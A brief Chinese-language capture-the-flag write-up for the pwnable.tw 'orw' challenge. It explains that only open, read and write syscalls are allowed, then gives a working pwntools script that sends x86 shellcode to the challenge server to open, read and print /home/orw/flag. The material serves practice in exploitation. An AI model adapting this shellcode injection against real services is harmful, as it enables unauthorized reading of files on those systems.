这题是让你上传 shellcode，然后程序去执行，但是题目说了，只能用 open、read、write 三个函数，而且已经说明了 flag 的路径是 /home/orw/flag

所以我们只要写汇编代码 open-read-write 这个文件的内容就可以了

exp

```python
from pwn import  *

p = remote('chall.pwnable.tw',10001)

p.recvuntil(':')

shellcode='''
push {};
push {};
push {};
push {};
mov ebx,esp;
xor ecx,ecx;
xor edx,edx;
xor eax,eax;
mov al,0x5;
int 0x80;
mov ebx,eax;
xor eax,eax;
mov al,0x3;
mov ecx,esp;
mov dl,0x30;
int 0x80;
mov al,0x4;
mov bl,1;
mov dl,0x30;
int 0x80;
'''.format(hex(u32('ag'+chr(0)+chr(0))),hex(u32('w/fl')),hex(u32('e/or')),hex(u32('/hom')))

p.send(asm(shellcode))
p.interactive()
```

